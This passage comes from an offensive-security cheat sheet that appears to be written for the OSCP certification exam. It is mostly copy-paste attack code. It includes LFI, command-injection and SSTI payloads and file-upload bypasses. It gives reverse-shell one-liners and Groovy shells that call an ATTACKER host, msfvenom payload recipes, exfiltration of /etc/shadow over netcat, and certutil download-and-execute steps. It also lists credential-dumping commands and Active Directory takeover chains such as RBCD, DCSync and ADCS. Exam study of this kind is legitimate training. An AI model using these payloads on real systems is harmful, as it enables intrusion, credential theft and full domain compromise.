  C:\xampp\apache\logs\access.log       ← For log poisoning

STEP 3 — LFI → RCE via PHP wrappers:
  # Read source code (base64 encoded)
  ?page=php://filter/convert.base64-encode/resource=config.php
  # Decode: echo "<output>" | base64 -d

  # Direct RCE via data:// (if allow_url_include=On)
  ?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

  # Zip wrapper (if you can upload a zip)
  ?page=zip://uploads/evil.zip#shell.php&cmd=id

STEP 4 — LFI → RCE via LOG POISONING:
  # Apache access log poisoning
  nc -v TARGET 80
  GET /<?php system($_GET['cmd']); ?> HTTP/1.1
  Host: TARGET
  # Then include the log:
  ?page=../../../../var/log/apache2/access.log&cmd=id

  # SSH auth log poisoning (if SSH is open)
  ssh '<?php system($_GET["cmd"]); ?>'@TARGET
  # Then include:
  ?page=../../../../var/log/auth.log&cmd=id

  # Common log paths:
  /var/log/apache2/access.log
  /var/log/apache2/error.log
  /var/log/nginx/access.log
  /var/log/auth.log
  /var/log/mail.log
  /var/log/vsftpd.log           ← If FTP is open
  C:\xampp\apache\logs\access.log
```

### File Upload Bypass Techniques

```
# If .php is blocked, try these extensions:
  .phtml .pHp .php3 .php4 .php5 .pHP .shtml .phps

# Double extension:
  shell.php.jpg    shell.php.png    shell.php%00.jpg (null byte, older PHP)

# Content-Type bypass (change in Burp):
  Content-Type: image/jpeg    ← Even though uploading .php

# Magic bytes bypass (prepend to PHP file):
  GIF89a;<?php system($_GET['cmd']); ?>

# .htaccess upload (then upload evil.gif with PHP code):
  AddType application/x-httpd-php .gif

# ASPX alternatives: .ashx .asmx .aspx .config

# Webshell locations to check after upload:
  /uploads/   /upload/   /images/   /img/   /attachments/
  /wp-content/uploads/   /media/   /files/   /tmp/
```

### Command Injection Payloads

```
# Separators to try (URL encode ; = %3b, & = %26):
  ; id
  | id
  || id
  & id
  && id
  $(id)
  `id`
  %0aid        ← Newline injection

# If spaces are filtered:
  cat${IFS}/etc/passwd
  {cat,/etc/passwd}
  cat</etc/passwd

# Reverse shell from command injection:
  ;bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
  ;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### SSTI (Server-Side Template Injection)

```
# Detection: inject into any input that reflects on page
  {{7*7}}         ← If shows 49, it's SSTI
  ${7*7}          ← Alternative syntax
  #{7*7}          ← Ruby ERB
  <%= 7*7 %>      ← EJS/ERB

# Jinja2 (Python/Flask) → RCE:
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  # Reverse shell (base64 encode the command):
  {{ cycler.__init__.__globals__.os.popen('echo BASE64_PAYLOAD | base64 -d | bash').read() }}
```

---

## 🥔 POTATO DECISION TREE — SeImpersonatePrivilege Quick Reference

```
whoami /priv → SeImpersonatePrivilege is ENABLED?

YES → Check Windows version:

  ┌─ ANY VERSION (try first):
  │   GodPotato-NET4.exe -cmd "C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
  │   # Check .NET version first: reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP"
  │   # Use NET2, NET35, or NET4 version accordingly
  │
  ├─ Server 2019+ / Win 10 1809+:
  │   PrintSpoofer64.exe -c "C:\temp\nc.exe ATTACKER PORT -e cmd.exe" -i
  │   # Only works if Print Spooler is running: sc query spooler
  │
  ├─ Server 2019+ (if PrintSpoofer fails):
  │   RoguePotato.exe -r ATTACKER -e "C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
  │   # Requires socat on attacker: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999
  │
  └─ Older (Server 2008-2016, Win 7-10 pre-1809):
      JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "ATTACKER PORT -e cmd.exe" -t * -c {CLSID}
      # Find CLSID: https://ohpe.it/juicy-potato/CLSID/

QUICK WIN — Create admin user instead of reverse shell:
  GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd1 /add && net localgroup administrators hacker /add"
  # Then: evil-winrm -i TARGET -u hacker -p 'P@ssw0rd1'
  # Or:   xfreerdp /v:TARGET /u:hacker /p:'P@ssw0rd1' /cert-ignore
```

---

## 🔄 FILE TRANSFER CHEATSHEET — Every Method You'll Need

### Kali → Linux Target
```bash
# Python HTTP server (on Kali)
python3 -m http.server 80
# On target:
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file

# Netcat
nc -lvnp 4444 < file          # Kali (sender)
nc ATTACKER 4444 > file         # Target (receiver)

# Base64 (no tools needed on target)
base64 file | tr -d '\n'       # On Kali, copy output
echo "BASE64STRING" | base64 -d > file   # On target
```

### Kali → Windows Target
```powershell
# PowerShell (most common)
iwr -uri http://ATTACKER/file -outfile C:\temp\file
certutil -urlcache -split -f http://ATTACKER/file C:\temp\file
# certutil works even when PowerShell is restricted!

# SMB server (on Kali — works even if HTTP fails)
impacket-smbserver share . -smb2support
# On target:
copy \\ATTACKER\share\file C:\temp\file
# If blocked, add creds:
impacket-smbserver share . -smb2support -user a -password a
net use \\ATTACKER\share /user:a a
copy \\ATTACKER\share\file C:\temp\file

# PowerShell Base64 (for small files, bypasses AV sometimes)
# On Kali:
cat file | base64 -w 0
# On target:
[IO.File]::WriteAllBytes("C:\temp\file", [Convert]::FromBase64String("BASE64"))
```

### Target → Kali (Exfiltration)
```bash
# On Kali: nc -lvnp 4444 > loot.txt
# On target: cat /etc/shadow | nc ATTACKER 4444

# On Kali: impacket-smbserver share . -smb2support
# On target (Windows): copy C:\Users\admin\Desktop\proof.txt \\ATTACKER\share\
```

---

## 📸 SCREENSHOT CHECKLIST — Don't Lose Points on Documentation

```
FOR EVERY FLAG:
  Screenshot MUST show ALL of the following in ONE screenshot:
  ✓ Contents of proof.txt or local.txt
  ✓ Output of whoami
  ✓ Output of hostname
  ✓ Output of ipconfig (Windows) or ip addr (Linux)

EXACT COMMANDS:
  # Linux
  cat /root/proof.txt && whoami && hostname && ip addr show

  # Linux (user flag)
  cat /home/*/local.txt && whoami && hostname && ip addr show

  # Windows (admin)
  type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig

  # Windows (user)
  type C:\Users\*\Desktop\local.txt & whoami & hostname & ipconfig

ALSO SCREENSHOT:
  ✓ Each exploitation step (the command AND the result)
  ✓ Reverse shell connection
  ✓ Privilege escalation command
  ✓ Any modified exploit code
```

---

## 🐚 REVERSE SHELL ARSENAL — Exam-Ready One-Liners

### Listeners
```bash
# Standard
nc -lvnp 4444
rlwrap nc -lvnp 4444    ← Better! Arrow keys work

# Penelope (auto-upgrade, recommended from Justin's notes)
python3 penelope.py 4444
```

### Linux Reverse Shells
```bash
# Bash (most reliable)
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# Netcat (with -e)
nc ATTACKER 4444 -e /bin/bash

# Netcat (without -e — mkfifo method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/bash <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Windows Reverse Shells
```powershell
# PowerShell (most common on OSCP)
powershell -e <BASE64_PAYLOAD>
# Generate base64 payload:
# On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev.exe
# Or use revshells.com for PowerShell base64

# PowerShell one-liner (no encoding)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat (if nc is on target)
nc.exe ATTACKER 4444 -e cmd.exe
```

### Shell Upgrade (CRITICAL — do immediately after landing)
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160

# Script method (if no python)
script -qc /bin/bash /dev/null
# Then same Ctrl+Z dance above
```

### msfvenom Payloads (Pre-generate before exam!)
```bash
# Windows x64 EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev64.exe

# Windows x86 EXE
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev32.exe

# Linux x64 ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o rev64.elf

# PHP webshell
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -o shell.php

# ASPX webshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi

# DLL (DLL Hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll

# HTA (Client-side)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta
```

---

## 🏰 AD SET DEEP DIVE — Assumed Breach to DC Compromise

> **Key insight: The AD set is 40 points ALL-OR-NOTHING. You start with low-priv domain creds.**
> **After pivoting to MS02 and MS03 (or DC), you will almost always need LOCAL privesc on each box.**
> **The pattern: Enumerate AD → Pivot to machine → Local privesc → Harvest creds → Move to next**

### The Realistic AD Exam Flow

```
You receive: low-priv domain user + password + IP of first machine (MS01)

MS01 (10 points)
  └─ RDP/WinRM in with provided creds
  └─ Local enumeration → privesc to local admin
  └─ Harvest creds from this machine (SAM, LSASS, configs, PS history)
  └─ These new creds unlock MS02

MS02 (10 points)
  └─ Lateral movement using harvested creds (WinRM, PsExec, RDP)
  └─ Land as low-priv user (again)
  └─ Local privesc AGAIN (different technique than MS01)
  └─ Harvest MORE creds
  └─ These creds + AD attack path → DC

DC (20 points)
  └─ DCSync / ADCS / RBCD / direct admin login
  └─ Full domain compromise
```

### AD Machine Privesc — What to Check IMMEDIATELY After Landing

This is the step people miss. You pivot to MS02 with domain creds but you're still low-priv:

```powershell
# 1. Check your privileges (most common exam win)
whoami /priv
# SeImpersonatePrivilege → GodPotato (see Potato Decision Tree above)
# SeBackupPrivilege → Copy SAM/SYSTEM or ntds.dit
# SeRestorePrivilege → Replace service binary
# SeManageVolumePrivilege → Full disk read access
# SeAssignPrimaryTokenPrivilege → Potato attacks

# 2. Check your groups
whoami /groups
net localgroup administrators
# Backup Operators → Can backup SAM/SYSTEM
# Server Operators → Can modify service binaries
# DnsAdmins → DLL injection into DNS service
# Remote Management Users → Confirms WinRM access

# 3. Check stored/cached credentials
cmdkey /list
# If creds stored → runas /savecred /user:admin cmd.exe

# 4. Check PowerShell history (MAJOR source of creds on exam)
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Check ALL users:
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 2>$null | ForEach-Object { Write-Host "=== $($_.FullName) ==="; Get-Content $_ }

# 5. Check AutoLogon registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: DefaultUserName, DefaultPassword, AutoAdminLogon

# 6. Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 0x1? → msfvenom MSI → msiexec /quiet /qn /i evil.msi

# 7. Check running services for hijack opportunities
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Look for: unquoted paths, writable directories, non-Windows paths

# 8. Check for writable service binaries / DLL directories
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *
accesschk.exe /accepteula -uwcqv "NT AUTHORITY\INTERACTIVE" *

# 9. Internal services not exposed externally
netstat -ano
# New service on 127.0.0.1:PORT? → Port forward it:
# chisel server -p 8888 --reverse    (on Kali)
# chisel client ATTACKER:8888 R:PORT:127.0.0.1:PORT  (on target)

# 10. Check for KeePass, config files, database files
dir /s /b C:\Users\*.kdbx C:\Users\*.config C:\Users\*.xml C:\Users\*.ini 2>nul
dir /s /b C:\*.kdbx 2>nul
# Found .kdbx? → Transfer to Kali, keepass2john, crack with hashcat -m 13400
```

### AD Credential Harvesting Checklist (Post Local Admin)

```powershell
# === REMOTE (from Kali, preferred — no files on disk) ===
nxc smb $TARGET -u 'localadmin' -p 'password' --sam           # Dump SAM hashes
nxc smb $TARGET -u 'localadmin' -p 'password' --lsa           # Dump LSA secrets
nxc smb $TARGET -u 'localadmin' -p 'password' --ntds          # DC only: dump all domain hashes
nxc smb $TARGET -u 'localadmin' -p 'password' -M lsassy       # Dump LSASS (requires bof or handle)

# === LOCAL (if you have RDP/interactive shell) ===
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# Registry SAM dump (no mimikatz needed)
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
reg save hklm\security C:\temp\SECURITY
# Transfer to Kali:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# === CHECK FOR CREDENTIAL FILES ===
# PowerShell history (AGAIN — different user now!)
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 2>$null | ForEach-Object { Get-Content $_ }

# FileZilla creds
type "C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml" 2>nul

# IIS config
type C:\inetpub\wwwroot\web.config 2>nul

# Unattend files
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\unattended.xml 2>nul
type C:\Windows\System32\Sysprep\unattend.xml 2>nul

# WiFi passwords (rare but possible)
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

### BloodHound — The Queries That Win the Exam

```
FIRST RUN THESE BUILT-IN QUERIES:
  1. "Find Shortest Paths to Domain Admins"
  2. "Find Kerberoastable Users"
  3. "Find AS-REP Roastable Users"
  4. "Find Principals with DCSync Rights"
  5. "Shortest Paths to High Value Targets"
  6. "Find Computers with Unsupported OS" → Likely has easy vulns

THEN CHECK YOUR COMPROMISED USER:
  → Right-click your user → "Outbound Object Control"
  → This shows EVERYTHING you can attack from this user
  → Common findings:
     GenericAll → Change password, set SPN, RBCD
     GenericWrite → Write scriptPath, set SPN for Kerberoast
     WriteDACL → Grant yourself DCSync rights
     ForceChangePassword → Change another user's password
     AddMember → Add yourself to privileged group
     ReadLAPSPassword → Read local admin passwords
     AllowedToDelegate → Constrained delegation → impersonate admin

CHECK EVERY COMPROMISED USER AS YOU GET NEW CREDS:
  → Mark each pwned user as "owned" in BloodHound
  → Re-run "Shortest Paths to Domain Admins from Owned Principals"
```

### AD Attack Execution — Copy-Paste Commands

```bash
# === ACL ABUSE ===

# GenericAll/GenericWrite over USER → Set SPN → Kerberoast
# From Linux:
python3 targetedKerberoast.py -u 'currentuser' -p 'password' -d 'domain.local' --dc-ip $DC
# From Windows:
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/spn'} -Verbose
Get-DomainSPNTicket -Identity targetuser | fl
# Then crack: hashcat -m 13100 hash.txt rockyou.txt

# GenericAll over USER → Change their password
# From Linux:
rpcclient -U 'user%password' $DC -c "setuserinfo2 targetuser 23 'NewP@ssw0rd!'"
# From Windows:
$pass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass

# WriteDACL over domain → Grant DCSync
# From Windows:
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity currentuser -Rights DCSync
# Then DCSync:
impacket-secretsdump domain.local/currentuser:'password'@$DC

# ForceChangePassword
rpcclient -U 'user%password' $DC -c "setuserinfo2 targetuser 23 'NewP@ssw0rd!'"

# AddMember to group
net group "Domain Admins" currentuser /add /domain

# === RBCD (Resource-Based Constrained Delegation) ===
# If you have GenericAll/GenericWrite over a COMPUTER object:

# Step 1: Add a fake computer
impacket-addcomputer -computer-name 'FAKEPC$' -computer-pass 'FakePass123!' -dc-ip $DC domain.local/user:'password'

# Step 2: Configure RBCD
impacket-rbcd -delegate-from 'FAKEPC$' -delegate-to 'TARGETPC$' -action write -dc-ip $DC domain.local/user:'password'

# Step 3: Get impersonated ticket
impacket-getST -spn 'cifs/TARGETPC.domain.local' -impersonate Administrator -dc-ip $DC domain.local/'FAKEPC$':'FakePass123!'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGETPC.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass domain.local/administrator@TARGETPC.domain.local

# === CONSTRAINED DELEGATION ===
# If AllowedToDelegate is set on a user/computer:
impacket-getST -spn 'cifs/DC.domain.local' -impersonate Administrator -dc-ip $DC domain.local/svcaccount:'password'
export KRB5CCNAME=Administrator@cifs_DC.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC.domain.local

# === ADCS (Certificate Abuse) ===
# ESC1: Vulnerable template allows specifying alternative subject
certipy req -u user@domain.local -p 'password' -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@domain.local -dc-ip $DC
certipy auth -pfx administrator.pfx -dc-ip $DC

# ESC4: Vulnerable template ACLs (can modify template)
certipy template -u user@domain.local -p 'password' -template 'VulnTemplate' -save-old
# Then request as ESC1 above

# === DCSync (final goal) ===
impacket-secretsdump domain.local/user:'password'@$DC
# Or with hash:
impacket-secretsdump -hashes :NTLM_HASH domain.local/user@$DC
# This dumps ALL domain hashes including Administrator
# Then:
impacket-psexec -hashes :ADMIN_NTLM_HASH domain.local/administrator@$DC
evil-winrm -i $DC -u administrator -H 'ADMIN_NTLM_HASH'
```

---

## 🔧 JENKINS EXPLOITATION — The Legendary OSCP Box

> **Jenkins often appears on non-standard ports (8080, 8443, 50000). In an AD set,
> it may be the foothold to get initial creds or pivot to the next machine.**

### Jenkins Discovery & Enumeration
```bash
# Jenkins typically runs on port 8080 or 50000
# In nmap output look for: "Jetty" or "Jenkins" or "Winstone"

# Check if accessible:
curl -s http://$IP:8080/ | head -20
curl -s http://$IP:50000/ | head -20

# Key URLs to check:
http://$IP:8080/                           # Main page
http://$IP:8080/login                      # Login form
http://$IP:8080/signup                     # Self-registration? Free account!
http://$IP:8080/script                     # Groovy console (admin only, JACKPOT)
http://$IP:8080/manage                     # Management console
http://$IP:8080/computer/                  # Shows OS type
http://$IP:8080/asynchPeople/              # Lists users
http://$IP:8080/securityRealm/user/admin/  # Enumerate users

# Directory brute-force (find hidden Jenkins instances):
gobuster dir -u http://$IP:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30
# Also check: /askjeeves (Jeeves HTB machine pattern)
```

### Jenkins Default Credentials to Try
```
admin:admin
admin:password
admin:jenkins
jenkins:jenkins
admin:<machinename>
admin:<blank>
# Also try: self-registration at /signup (if enabled!)
```

### Jenkins Groovy Script Console → RCE (The Money Shot)

If you can access /script (admin access), you have RCE:

```groovy
// === WINDOWS REVERSE SHELL ===
String host="ATTACKER_IP";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

// === LINUX REVERSE SHELL ===
String host="ATTACKER_IP";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

// === SIMPLE COMMAND EXECUTION (test first) ===
def proc = "cmd /c whoami".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());

// Linux version:
def proc = "id".execute();
println proc.text;

// === DOWNLOAD AND EXECUTE (if reverse shell doesn't work) ===
def proc = "cmd /c certutil -urlcache -split -f http://ATTACKER/nc.exe C:\\temp\\nc.exe".execute();
println proc.text;
def proc2 = "cmd /c C:\\temp\\nc.exe ATTACKER 4444 -e cmd.exe".execute();
```

### Jenkins Without Admin Access — Build Step Exploitation

If you can create or modify a Jenkins job/project (not full admin):

```
1. Navigate to a job → Configure
2. Add Build Step → "Execute Windows batch command" or "Execute shell"
3. Enter your reverse shell payload
4. Save and click "Build Now"

# Windows build step:
powershell -e <BASE64_REVERSE_SHELL>
# Or:
certutil -urlcache -split -f http://ATTACKER/nc.exe C:\temp\nc.exe && C:\temp\nc.exe ATTACKER 4444 -e cmd.exe

# Linux build step:
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

### Jenkins Secret Extraction (Post-Exploit)

```bash
# Jenkins stores encrypted secrets. Decrypt them:
# Needed files (on Jenkins server):
#   credentials.xml (or jobs/*/config.xml)
#   secrets/master.key
#   secrets/hudson.util.Secret

# Default Jenkins home directories:
# Windows: C:\Users\<user>\.jenkins\ or C:\ProgramData\Jenkins\.jenkins\
# Linux:   /var/lib/jenkins/ or ~/.jenkins/

# Decrypt offline (on Kali):
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
# Tool: https://github.com/gquere/pwn_jenkins

# Or decrypt from Groovy console:
println(hudson.util.Secret.decrypt("{encrypted_secret_here}"))
```

### Jenkins CVEs to Know

```
CVE-2024-23897 — Arbitrary file read via CLI (CRITICAL)
  # Download CLI jar:
  wget http://TARGET:8080/jnlpJars/jenkins-cli.jar
  # Read files:
  java -jar jenkins-cli.jar -s http://TARGET:8080 who-am-i @/etc/passwd
  # Read Jenkins secrets:
  java -jar jenkins-cli.jar -s http://TARGET:8080 who-am-i @/var/lib/jenkins/secrets/master.key

CVE-2019-1003000 — Sandbox bypass RCE (if script security plugin < 1.49)
CVE-2018-1000861 — Unauthenticated RCE via Stapler
```

---

## 📡 API TESTING — OSCP Web Attack Vector

> **APIs are increasingly common on OSCP standalone machines. They expose
> endpoints that accept JSON/parameters and may have different auth than the main site.**

### API Discovery
```bash
# Look for API indicators in web enumeration:
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,yaml -t 50
# Common API paths:
/api/    /api/v1/    /api/v2/    /rest/    /graphql
/swagger.json    /swagger-ui    /api-docs    /openapi.json
/v1/    /v2/    /_api/    /api/users    /api/admin

# Check for API documentation:
curl -s http://$IP/swagger.json | python3 -m json.tool
curl -s http://$IP/openapi.json | python3 -m json.tool
curl -s http://$IP/api-docs

# Test if API responds differently to JSON requests:
curl -s http://$IP/api/users -H "Content-Type: application/json"
curl -s http://$IP/api/ -H "Accept: application/json"
```

### API Exploitation Techniques
```bash
# 1. Authentication bypass — test endpoints without tokens
curl -s http://$IP/api/admin/users
curl -s http://$IP/api/v1/admin

# 2. IDOR — Change IDs in requests
curl -s http://$IP/api/user/1
curl -s http://$IP/api/user/2    ← Can you see other users?
curl -s http://$IP/api/user/0    ← Admin is often ID 0 or 1

# 3. Parameter tampering — add role/admin fields
curl -s http://$IP/api/register -X POST -H "Content-Type: application/json" -d '{"username":"test","password":"test","role":"admin"}'
curl -s http://$IP/api/user/update -X PUT -H "Content-Type: application/json" -d '{"id":1,"role":"admin"}'

# 4. SQLi in API parameters
curl -s "http://$IP/api/user?id=1' OR 1=1-- -"
curl -s http://$IP/api/login -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"' OR 1=1-- -"}'

# 5. Command injection in API
curl -s http://$IP/api/execute -X POST -d '{"cmd":"id"}'
curl -s http://$IP/api/ping -X POST -d '{"host":"127.0.0.1;id"}'

# 6. JWT token manipulation
# Decode: echo "HEADER.PAYLOAD.SIGNATURE" | cut -d'.' -f2 | base64 -d
# Change role to admin, change alg to "none"
# Tool: python3 jwt_tool.py TOKEN -T

# 7. Check HTTP methods (PUT/DELETE may be enabled)
curl -s -X OPTIONS http://$IP/api/users -v
curl -s -X PUT http://$IP/api/users/1 -d '{"role":"admin"}'
curl -s -X DELETE http://$IP/api/users/2

# 8. API version rollback (v2 may have auth, v1 might not)
curl -s http://$IP/api/v1/admin    ← Old version, maybe no auth?
curl -s http://$IP/api/v2/admin    ← New version with auth
```

### API Fuzzing for Hidden Endpoints
```bash
# Fuzz endpoints:
ffuf -u http://$IP/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -mc 200,201,301,302,403
ffuf -u http://$IP/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,301,302

# Fuzz parameters:
ffuf -u "http://$IP/api/user?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0
```

### 🎯 REAL EXAM: API Info Disclosure → Initial Access (a practice attempt — a target)
```bash
# PATTERN: IIS + /backend/api/ structure with v1/v2 versioning
# a target had 403 Forbidden on root, but feroxbuster found /backend/api/

# Step 1: Feroxbuster found the API structure:
feroxbuster -u http://$IP
# Found: /backend/ → /backend/api/ → /backend/api/v1/ + /backend/api/v2/

# Step 2: Info disclosure on dev endpoint:
curl -i http://$IP/backend/api/v1/dev
# Leaked: PASSWORD, SECRET_PHRASE, API_KEY, SPECIAL_NUMBER

# Step 3: Dirb found CRUD operations and user enumeration:
dirb http://$IP/backend/api/v2
# Found:
#   /api/v2/ping     (200, health check)
#   /api/v2/user/add     (200)
#   /api/v2/user/edit    (200)
#   /api/v2/user/profile (200)
#   /api/v2/user/remove  (200)
#   /api/v2/users/1 through /users/6  (IDOR!)
#   /api/v2/emails/

# Step 4: TRY LEAKED CREDS IMMEDIATELY ON EVERY SERVICE:
evil-winrm -i $IP -u administrator -p 'LEAKED_PASSWORD'
evil-winrm -i $IP -u FOUND_USERNAME -p 'LEAKED_PASSWORD'
smbclient -L \\\\$IP -U administrator%LEAKED_PASSWORD
netexec smb $IP -u administrator -p 'LEAKED_PASSWORD'
netexec winrm $IP -u administrator -p 'LEAKED_PASSWORD'

# Step 5: If creds don't work directly, use API to extract more data:
# Try various auth header combinations:
curl -s http://$IP/api/v2/users -H "X-API-KEY: API_KEY_VALUE"
curl -s http://$IP/api/v2/users -H "Authorization: Bearer API_KEY_VALUE"
curl -s http://$IP/api/v2/users -H "X-API-KEY: KEY" -H "X-SECRET-KEY: SECRET"
# Try query params:
curl -s "http://$IP/api/v2/users?api_key=KEY&secret_key=SECRET"
# Try POST with JSON body:
curl -s http://$IP/api/v2/users -X POST -H "Content-Type: application/json" \
  -d '{"api_key":"KEY","secret_key":"SECRET","special_number":24}'

# ⚠️ LESSON LEARNED: DON'T enumerate API headers for 2 hours.
# TRY THE PASSWORD ON WINRM/SMB/RDP FIRST — it takes 30 seconds!
```

---

## 🔁 AD LOCAL PRIVESC WITHIN LATERAL MOVEMENT — The Step People Fail On

> **The #1 reason people get 20/40 on the AD set instead of 40/40.**
> **You pivot to MS02 or the DC with domain creds → you land as a low-priv domain user.**
> **You MUST escalate locally on that box to harvest the creds that move you forward.**

### Realistic Multi-Stage AD Exam Scenarios

These are the patterns from PEN-200 challenge labs (Secura, MedTech, Relia, OSCP A/B/C):

```
SCENARIO A — Service Account Path:
  MS01: Land with given creds → find web app or service →
        service runs as LocalSystem → SeImpersonatePrivilege → GodPotato →
        dump SAM/LSASS → find creds for service account →
        Kerberoast that account → crack hash → creds for MS02

  MS02: WinRM in with cracked service account creds → low-priv domain user →
        check running services → find unquoted service path or writable service binary →
        replace binary or exploit path → restart service → local admin →
        dump LSASS → find DA creds or hash → DCSync or PsExec to DC

SCENARIO B — Jenkins/Web App Path (the "legendary" set):
  MS01: Land with given creds → enumerate → Jenkins on port 8080 →
        login with found/default creds → Groovy console → reverse shell →
